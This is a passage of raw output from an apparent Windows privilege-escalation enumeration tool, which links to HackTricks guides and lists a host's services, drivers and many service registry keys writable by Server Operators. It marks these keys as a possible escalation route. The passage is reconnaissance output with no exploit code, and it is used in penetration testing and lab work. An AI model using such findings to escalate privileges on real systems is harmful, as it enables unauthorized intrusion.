È Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#running-processes                                                                                                    
  [X] Exception: Access denied 

ÉÍÍÍÍÍÍÍÍÍÍ¹ Vulnerable Leaked Handlers (T1134.001)
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#leaked-handlers
È Getting Leaked Handlers, it might take some time...
    Not Found


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Services Information (T1007,T1543.003,T1574.001,T1574.011,T1014,T1068) ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
  [X] Exception: Cannot open Service Control Manager on computer '.'. This operation might require other privileges.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft- (T1007)
È Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services                                                                                                     
  [X] Exception: Access denied 
    @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver(PMC-Sierra, Inc. - @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver)[System32\drivers\arcsas.sys] - Boot
   =================================================================================================

    @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD(QLogic Corporation - @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD)[System32\drivers\bxvbda.sys] - Boot                                                                                                                                           
   =================================================================================================

    @bcmfn.inf,%bcmfn.SVCDESC%;bcmfn Service(Windows (R) Win 7 DDK provider - @bcmfn.inf,%bcmfn.SVCDESC%;bcmfn Service)[C:\Windows\System32\drivers\bcmfn.sys] - System                                                                                                                                                 
   =================================================================================================

    @bcmfn2.inf,%bcmfn2.SVCDESC%;bcmfn2 Service(Windows (R) Win 7 DDK provider - @bcmfn2.inf,%bcmfn2.SVCDESC%;bcmfn2 Service)[C:\Windows\System32\drivers\bcmfn2.sys] - System                                                                                                                                          
   =================================================================================================

    @bxfcoe.inf,%BXFCOE.SVCDESC%;QLogic FCoE Offload driver(QLogic Corporation - @bxfcoe.inf,%BXFCOE.SVCDESC%;QLogic FCoE Offload driver)[System32\drivers\bxfcoe.sys] - Boot                                                                                                                                           
   =================================================================================================

    @bxois.inf,%BXOIS.SVCDESC%;QLogic Offload iSCSI Driver(QLogic Corporation - @bxois.inf,%BXOIS.SVCDESC%;QLogic Offload iSCSI Driver)[System32\drivers\bxois.sys] - Boot                                                                                                                                              
   =================================================================================================

    @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver(Chelsio Communications - @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver)[C:\Windows\System32\drivers\cht4vx64.sys] - System                                                                                                                  
   =================================================================================================

    @net1ix64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I(Intel Corporation - @net1ix64.inf,%e1iExpress.Service.DispName%;Intel(R) PRO/1000 PCI Express Network Connection Driver I)[C:\Windows\System32\drivers\e1i63x64.sys] - System
   =================================================================================================

    @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD(QLogic Corporation - @netevbda.inf,%vbd_srv_desc%;QLogic 10 Gigabit Ethernet Adapter VBD)[System32\drivers\evbda.sys] - Boot
   =================================================================================================

    @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver(Intel Corporation - @ialpssi_gpio.inf,%iaLPSSi_GPIO.SVCDESC%;Intel(R) Serial IO GPIO Controller Driver)[C:\Windows\System32\drivers\iaLPSSi_GPIO.sys] - System
   =================================================================================================

    @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver(Intel Corporation - @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver)[C:\Windows\System32\drivers\iaLPSSi_I2C.sys] - System
   =================================================================================================

    @iastorav.inf,%iaStorAV.DeviceDesc%;Intel(R) SATA RAID Controller Windows(Intel Corporation - @iastorav.inf,%iaStorAV.DeviceDesc%;Intel(R) SATA RAID Controller Windows)[System32\drivers\iaStorAV.sys] - Boot
   =================================================================================================

    @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7(Intel Corporation - @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7)[System32\drivers\iaStorV.sys] - Boot
   =================================================================================================

    @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver)(Mellanox - @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver))[C:\Windows\System32\drivers\ibbus.sys] - System
   =================================================================================================

    @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator(Mellanox - @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator)[C:\Windows\System32\drivers\mlx4_bus.sys] - System                                                                                                            
   =================================================================================================

    @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service(Mellanox - @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service)[C:\Windows\System32\drivers\ndfltr.sys] - System                                                                                                                                      
   =================================================================================================

    @ql2300.inf,%ql2300i.DriverDesc%;QLogic Fibre Channel STOR Miniport Inbox Driver (wx64)(QLogic Corporation - @ql2300.inf,%ql2300i.DriverDesc%;QLogic Fibre Channel STOR Miniport Inbox Driver (wx64))[System32\drivers\ql2300i.sys] - Boot
   =================================================================================================

    @ql40xx2i.inf,%ql40xx2i.DriverDesc%;QLogic iSCSI Miniport Inbox Driver(QLogic Corporation - @ql40xx2i.inf,%ql40xx2i.DriverDesc%;QLogic iSCSI Miniport Inbox Driver)[System32\drivers\ql40xx2i.sys] - Boot
   =================================================================================================

    @qlfcoei.inf,%qlfcoei.DriverDesc%;QLogic [FCoE] STOR Miniport Inbox Driver (wx64)(QLogic Corporation - @qlfcoei.inf,%qlfcoei.DriverDesc%;QLogic [FCoE] STOR Miniport Inbox Driver (wx64))[System32\drivers\qlfcoei.sys] - Boot
   =================================================================================================

    SQL Server Agent (MSSQLSERVER)(SQL Server Agent (MSSQLSERVER))["C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\SQLAGENT.EXE" -i MSSQLSERVER] - System                                                                                                                                         
    Executes jobs, monitors SQL Server, fires alerts, and allows automation of some administrative tasks.
   =================================================================================================                                                        

    @usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver(@usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver)[C:\Windows\System32\drivers\USBSTOR.SYS] - System
   =================================================================================================

    @usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller(@usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller)[C:\Windows\System32\drivers\USBXHCI.SYS] - System                                                                                                            
   =================================================================================================

    VMware Alias Manager and Ticket Service(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Autoload                                                                                                                                  
    Alias Manager and Ticket Service
   =================================================================================================                                                        

    @oem8.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service(VMware, Inc. - @oem8.inf,%VM3DSERVICE_DISPLAYNAME%;VMware SVGA Helper Service)[C:\Windows\system32\vm3dservice.exe] - Autoload                                                                                                                       
    @oem8.inf,%VM3DSERVICE_DESCRIPTION%;Helps VMware SVGA driver by collecting and conveying user mode information
   =================================================================================================                                                        

    @oem2.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver(VMware, Inc. - @oem2.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver)[System32\drivers\vmci.sys] - Boot                                                                                                                                       
   =================================================================================================

    Memory Control Driver(VMware, Inc. - Memory Control Driver)[C:\Windows\system32\DRIVERS\vmmemctl.sys] - Autoload
    Driver to provide enhanced memory management of this virtual machine.
   =================================================================================================                                                        

    @oem7.inf,%VMMouse.SvcDesc%;VMware Pointing Device(VMware, Inc. - @oem7.inf,%VMMouse.SvcDesc%;VMware Pointing Device)[C:\Windows\System32\drivers\vmmouse.sys] - System                                                                                                                                             
   =================================================================================================

    @oem6.inf,%VMUsbMouse.SvcDesc%;VMware USB Pointing Device(VMware, Inc. - @oem6.inf,%VMUsbMouse.SvcDesc%;VMware USB Pointing Device)[C:\Windows\System32\drivers\vmusbmouse.sys] - System                                                                                                                            
   =================================================================================================

    @oem9.inf,%loc.vmxnet3.ndis6.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver(VMware, Inc. - @oem9.inf,%loc.vmxnet3.ndis6.DispName%;vmxnet3 NDIS 6 Ethernet Adapter Driver)[C:\Windows\System32\drivers\vmxnet3.sys] - System
   =================================================================================================

    vSockets Virtual Machine Communication Interface Sockets driver(VMware, Inc. - vSockets Virtual Machine Communication Interface Sockets driver)[system32\DRIVERS\vsock.sys] - Boot                                                                                                                                  
    vSockets Driver
   =================================================================================================                                                        

    @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver(VIA Corporation - @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver)[System32\drivers\vstxraid.sys] - Boot
   =================================================================================================

    @%SystemRoot%\System32\drivers\vwifibus.sys,-257(@%SystemRoot%\System32\drivers\vwifibus.sys,-257)[C:\Windows\System32\drivers\vwifibus.sys] - System
    @%SystemRoot%\System32\drivers\vwifibus.sys,-258
   =================================================================================================                                                        

    @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service(Mellanox - @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service)[C:\Windows\System32\drivers\winmad.sys] - System
   =================================================================================================

    @winusb.inf,%WINUSB_SvcDesc%;WinUsb Driver(@winusb.inf,%WINUSB_SvcDesc%;WinUsb Driver)[C:\Windows\System32\drivers\WinUSB.SYS] - System
   =================================================================================================

    @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service(Mellanox - @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service)[C:\Windows\System32\drivers\winverbs.sys] - System                                                                                                                                          
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Modifiable Services (T1543.003)
È Check if you can modify any service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
    You cannot modify any service

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking if you can modify any service registry (T1574.011)
È Check if you can modify the registry of a service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services-registry-modify-permissions                                                                                                                                
    HKLM\system\currentcontrolset\services\.NET CLR Data (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\.NET CLR Networking (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\.NET CLR Networking 4.0.0.0 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\.NET Data Provider for Oracle (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\.NET Data Provider for SqlServer (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\.NET Memory Cache 4.0 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\.NETFramework (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\1394ohci (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\3ware (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ACPI (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AcpiDev (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\acpiex (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\acpipagr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AcpiPmi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\acpitime (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ADOVMPPackage (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ADP80XX (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\adsi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ADWS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AFD (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ahcache (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AJRouter (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ALG (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AmdK8 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AmdPPM (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\amdsata (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\amdsbs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\amdxata (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AppHostSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AppID (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AppIDSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Appinfo (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\applockerfltr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AppMgmt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AppReadiness (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AppVClient (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AppvStrm (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AppvVemgr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AppvVfs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AppXSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\arcsas (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ASP.NET (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ASP.NET_4.0.30319 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\aspnet_state (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AsyncMac (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\atapi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AudioEndpointBuilder (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Audiosrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\AxInstSV (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\b06bdrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\BasicDisplay (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\BasicRender (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\BattC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\bcmfn (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\bcmfn2 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Beep (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\bfadfcoei (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\bfadi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\BFE (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\BITS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\bowser (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\BrokerInfrastructure (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\BTHPORT (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\bthserv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\buttonconverter (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\bxfcoe (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\bxois (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CapImg (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\cdfs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CDPSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CDPUserSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CDPUserSvc_4cbe7 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\cdrom (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CertPropSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\cht4iscsi (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\cht4vbd (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CLFS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ClipSVC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\clreg (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\clr_optimization_v4.0.30319_32 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\clr_optimization_v4.0.30319_64 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CmBatt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CNG (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\cnghwassist (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CompositeBus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\COMSysApp (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\condrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CoreMessagingRegistrar (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CoreUI (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\crypt32 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CryptSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CSC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\CscService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\dam (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DCLocator (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DcpSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\defragsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DeviceAssociationService (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DeviceInstall (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DevQueryBroker (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Dfs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Dfsc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DfsDriver (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DFSR (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DfsrRo (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\diaghub (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\diagnosticshub.standardcollector.service (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DiagTrack (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DirectoryServices (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Disk (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DmEnrollmentSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\dmvsc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\dmwappushservice (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DNS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Dnscache (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\dot3svc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DsmSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DsRoleSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DsSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\DXGKrnl (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\e1iexpress (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Eaphost (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ebdrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\efifw (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\EFS (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\EhStorClass (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\EhStorTcgDrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\elxfcoe (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\elxstor (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\embeddedmode (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\EntAppSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ErrDev (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ESENT (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\EventSystem (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\exfat (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\fastfat (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\fcvsc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\fdc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\fdPHost (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\FDResPub (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\FileCrypt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\FileInfo (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Filetrace (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\flpydisk (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\FltMgr (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\FontCache (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\FrameServer (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\FsDepends (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\Fs_Rec (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\gencounter (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\genericusbfn (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\GPIOClx0101 (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\GpuEnergyDrv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\HDAudBus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\HidBatt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\HidBth (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\hidinterrupt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\hidserv (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\HidUsb (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\HomeGroupListener (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\HpSAMD (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\HTTP (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\HvHost (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\hvservice (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\hwpolicy (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\hyperkbd (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\HyperVideo (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\iaLPSSi_GPIO (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\iaLPSSi_I2C (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\iaStorAV (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\iaStorV (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\ibbus (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\icssvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\IKEEXT (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\IndirectKmd (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\inetaccs (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\InetInfo (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\intelpep (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\intelppm (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\iorate (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\IpFilterDriver (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\iphlpsvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\IPMIDRV (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\IPNAT (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\IPsecGW (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\isapnp (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\iScsiPrt (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\IsmServ (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\kbdclass (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\kbdhid (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\kdnic (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\KdsSvc (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\KeyIso (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\KPSSVC (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\KSecDD (Server Operators [Allow: WriteKey GenericWrite])
    HKLM\system\currentcontrolset\services\KSecPkg (Server Operators [Allow: WriteKey GenericWrite])
